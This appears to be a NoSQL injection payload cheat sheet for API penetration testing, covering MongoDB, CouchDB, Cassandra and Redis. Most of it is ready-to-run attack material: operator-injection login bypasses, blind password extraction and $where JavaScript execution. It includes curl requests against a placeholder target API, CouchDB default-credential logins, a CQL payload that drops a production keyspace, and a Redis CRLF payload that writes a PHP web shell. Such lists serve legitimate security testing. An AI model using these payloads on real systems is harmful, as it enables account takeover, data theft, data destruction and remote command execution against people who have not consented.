# NoSQL Injection Payloads — API Security Testing
# OWASP API Security: API8/API10 — Injection
# Severity: HIGH to CRITICAL
# Targets: MongoDB, CouchDB, Cassandra, Redis

# ============================================================
# 1. MONGODB — OPERATOR INJECTION
# ============================================================

# Authentication bypass — JSON body
{"email": {"$gt": ""}, "password": {"$gt": ""}}
{"email": {"$ne": "nonexistent"}, "password": {"$ne": "nonexistent"}}
{"email": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"email": {"$exists": true}, "password": {"$exists": true}}
{"email": {"$nin": []}, "password": {"$nin": []}}

# Auth bypass — query parameter style
email[$gt]=&password[$gt]=
email[$ne]=nonexistent&password[$ne]=nonexistent
email[$regex]=.*&password[$regex]=.*
email[$exists]=true&password[$exists]=true

# Extract data with $regex
{"email": "admin@target.com", "password": {"$regex": "^a"}}
{"email": "admin@target.com", "password": {"$regex": "^ab"}}
{"email": "admin@target.com", "password": {"$regex": "^abc"}}
# Continue character by character based on true/false response

# Extract with $gt (boolean blind)
{"email": "admin@target.com", "password": {"$gt": "a"}}
{"email": "admin@target.com", "password": {"$gt": "m"}}
# Binary search based on response

# ============================================================
# 2. MONGODB — $WHERE INJECTION
# ============================================================

# JavaScript execution in $where
{"$where": "1==1"}
{"$where": "this.password == 'admin'"}
{"$where": "this.email.match(/.*/)"}
{"$where": "sleep(5000)"}
{"$where": "function(){return true}"}
{"$where": "this.password.match(/^a/) == true"}

# Time-based blind
{"$where": "if(this.email=='admin@target.com'){sleep(5000)}else{return false}"}

# Via query parameter
filter[$where]=1==1
search[$where]=this.password.match(/.*/)

# ============================================================
# 3. MONGODB — AGGREGATION PIPELINE INJECTION
# ============================================================

# $lookup to access other collections
{"pipeline": [{"$lookup": {"from": "users", "localField": "user_id", "foreignField": "_id", "as": "user_data"}}]}

# $group to extract data
{"pipeline": [{"$group": {"_id": "$email", "passwords": {"$push": "$password"}}}]}

# ============================================================
# 4. MONGODB — COMMON API PATTERNS
# ============================================================

# REST API — JSON body injection
curl -X POST https://api.target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$gt": ""}, "password": {"$gt": ""}}'

# REST API — query parameter injection
curl "https://api.target.com/api/v1/users?email[\$ne]=nonexistent"
curl "https://api.target.com/api/v1/users?email[\$regex]=admin"
curl "https://api.target.com/api/v1/products?price[\$gt]=0&price[\$lt]=99999"

# GraphQL with NoSQL backend
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query($e:JSON!,$p:JSON!){login(email:$e,password:$p){token}}","variables":{"e":{"$gt":""},"p":{"$gt":""}}}'

# Overriding type with array
curl -X POST https://api.target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"email": ["admin@target.com"], "password": {"$gt": ""}}'

# ============================================================
# 5. COUCHDB INJECTION
# ============================================================

# CouchDB uses Mango queries (JSON-based)
# Auth bypass via selector injection
{"selector": {"email": "admin@target.com", "password": {"$gt": null}}}
{"selector": {"$or": [{"email": "admin@target.com"}, {"email": "anything"}]}}

# View abuse
curl https://target.com:5984/_all_dbs
curl https://target.com:5984/dbname/_all_docs?include_docs=true
curl https://target.com:5984/_users/_all_docs?include_docs=true

# CouchDB default credentials
curl https://target.com:5984/ -u admin:admin
curl https://target.com:5984/ -u admin:password
curl https://target.com:5984/ -u admin:couchdb

# ============================================================
# 6. CASSANDRA INJECTION
# ============================================================

# CQL injection (similar to SQL)
' OR ''='
' OR 1=1 ALLOW FILTERING--
'; DROP KEYSPACE production;--
' AND token(id) > token(0) ALLOW FILTERING--

# Via API parameters
curl "https://api.target.com/api/v1/users?name=' OR ''='"
curl "https://api.target.com/api/v1/search?q=' OR 1=1 ALLOW FILTERING--"

# ============================================================
# 7. REDIS INJECTION
# ============================================================

# If user input reaches Redis commands
# CRLF injection to execute arbitrary commands
\r\nSET pwned true\r\n
\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET payload "<?php system($_GET['cmd']);?>"\r\nSAVE\r\n

# Via URL parameters
param=value%0D%0ASET%20pwned%20true

# Key enumeration
KEYS *
KEYS user:*
KEYS session:*
KEYS token:*

# ============================================================
# 8. DETECTION PAYLOADS (Universal)
# ============================================================

# Time-based detection
{"$where": "sleep(5000)"}
{"password": {"$regex": "^(?:a]){10000}x"}}

# Error-based detection
{"password": {"$invalid_operator": true}}
{"email": {"$type": 999}}
{"$or": "invalid"}
{"$and": "invalid"}

# Boolean detection
# True condition (returns data):
{"email": {"$gt": ""}}
# False condition (returns nothing):
{"email": {"$gt": "zzzzzzzzzzzzz"}}

# ============================================================
# 9. TESTING METHODOLOGY
# ============================================================

# 1. Identify NoSQL backend (MongoDB, CouchDB, etc.)
#    - Check error messages
#    - Check technology headers (X-Powered-By)
#    - Check job listings / public repos for tech stack
# 2. Test operator injection on every input field
# 3. Test both JSON body and query parameter syntax
# 4. Use boolean-based blind extraction if no direct output
# 5. Use time-based blind if no boolean difference
# 6. Try $where for JavaScript execution
# 7. Test authentication endpoints first (highest impact)
